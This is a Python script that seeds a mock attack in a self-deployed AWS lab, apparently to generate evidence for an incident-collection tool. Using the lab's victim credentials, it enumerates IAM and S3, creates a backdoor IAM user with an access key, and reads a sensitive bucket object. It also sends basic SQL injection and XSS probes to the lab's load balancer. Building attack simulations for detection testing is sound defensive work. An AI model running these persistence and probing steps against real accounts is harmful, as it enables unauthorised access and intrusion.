#!/usr/bin/env python3
"""Seed a coherent attack story in the live AWS collector lab.

Mirrors the narrative in tests/fixtures/generate_demo_case.py so every collector
pulls evidence from the same incident: compromised dbadmin → recon → persistence →
S3 exfil → WAF/ALB probing.

Reads terraform outputs from docs/deployment/aws/collector-lab/terraform unless
--profile/--region are passed explicitly.

Usage:
    cd docs/deployment/aws/collector-lab/terraform && terraform output -json > /tmp/lab.json
    uv run python docs/deployment/aws/collector-lab/seed/seed_attack_story.py --outputs /tmp/lab.json
    make aws-lab-seed
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

import boto3


STORY_USER = "ventra-lab-backdoor"
ATTACK_PATHS = [
    ("T1078.004", "Initial access — API calls as compromised dbadmin"),
    ("T1526", "Discovery — account enumeration"),
    ("T1098.001", "Persistence — backdoor IAM user + access key"),
    ("T1530", "Collection — sensitive S3 object reads"),
    ("T1190", "Exploit public app — SQLi/XSS probes against ALB (WAF blocks)"),
]


def load_outputs(path: Path | None) -> dict:
    if path and path.is_file():
        raw = json.loads(path.read_text(encoding="utf-8"))
        return {k: v["value"] if isinstance(v, dict) and "value" in v else v for k, v in raw.items()}
    tf_dir = Path(__file__).resolve().parents[1] / "terraform"
    proc = subprocess.run(
        ["terraform", "output", "-json"],
        cwd=tf_dir,
        check=True,
        capture_output=True,
        text=True,
    )
    raw = json.loads(proc.stdout)
    return {k: v["value"] for k, v in raw.items()}


def http_probe(url: str, path: str, query: str = "") -> None:
    target = f"{url.rstrip('/')}{path}"
    if query:
        target = f"{target}?{urllib.parse.quote(query, safe='=&')}"
    try:
        urllib.request.urlopen(target, timeout=15)  # noqa: S310
    except (urllib.error.HTTPError, urllib.error.URLError, OSError):
        pass


def main() -> int:
    parser = argparse.ArgumentParser(description="Seed Ventra AWS collector lab attack story")
    parser.add_argument("--outputs", type=Path, help="terraform output -json file")
    parser.add_argument("--profile", default=None)
    parser.add_argument("--region", default=None)
    parser.add_argument("--skip-http", action="store_true", help="Skip ALB/WAF HTTP probes")
    args = parser.parse_args()

    outputs = load_outputs(args.outputs)
    region = args.region or outputs["region"]
    session = boto3.Session(profile_name=args.profile, region_name=region)
    creds = session.client("sts").get_caller_identity()
    print(f"[*] Seeding lab in account {creds['Account']} ({region})")

    victim_key = outputs.get("victim_access_key_id")
    victim_secret = outputs.get("victim_secret_access_key")
    if not victim_key or not victim_secret:
        print("Missing victim credentials in terraform outputs", file=sys.stderr)
        return 1

    attacker = boto3.Session(
        aws_access_key_id=victim_key,
        aws_secret_access_key=victim_secret,
        region_name=region,
    )
    iam = attacker.client("iam")
    s3 = attacker.client("s3")
    gd = session.client("guardduty")

    print("[1/5] Discovery burst as compromised dbadmin")
    for action in (
        lambda: iam.list_users(),
        lambda: iam.list_roles(),
        lambda: iam.list_access_keys(UserName=outputs["victim_user"]),
        lambda: s3.list_buckets(),
    ):
        action()
        time.sleep(0.3)

    print("[2/5] Persistence — create backdoor user")
    try:
        iam.create_user(UserName=STORY_USER, Tags=[{"Key": "Story", "Value": "persistence"}])
    except iam.exceptions.EntityAlreadyExistsException:
        pass
    iam.attach_user_policy(
        UserName=STORY_USER,
        PolicyArn="arn:aws:iam::aws:policy/ReadOnlyAccess",
    )
    try:
        iam.create_access_key(UserName=STORY_USER)
    except iam.exceptions.LimitExceededException:
        pass

    print("[3/5] Collection — read sensitive bucket marker object")
    bucket = outputs["sensitive_bucket"]
    s3.get_object(Bucket=bucket, Key="exports/db-dump-2026-06-07.sql.gz")

    print("[4/5] GuardDuty sample findings")
    detector = outputs.get("guardduty_detector_id")
    if detector:
        gd.create_sample_findings(DetectorId=detector)

    if not args.skip_http:
        print("[5/5] Web probes — ALB admin panel + WAF triggers")
        alb = f"http://{outputs['alb_dns_name']}"
        for path in ("/", "/admin-panel", "/admin-panel/login"):
            http_probe(alb, path)
        http_probe(alb, "/search", "q=' OR 1=1--")
        http_probe(alb, "/comment", "body=<script>alert(1)</script>")

    print("\nAttack story seeded. Mapped techniques:")
    for technique, desc in ATTACK_PATHS:
        print(f"  - {technique}: {desc}")
    print("\nRun Ventra collection with connection to this account and case id:", outputs.get("case_id"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
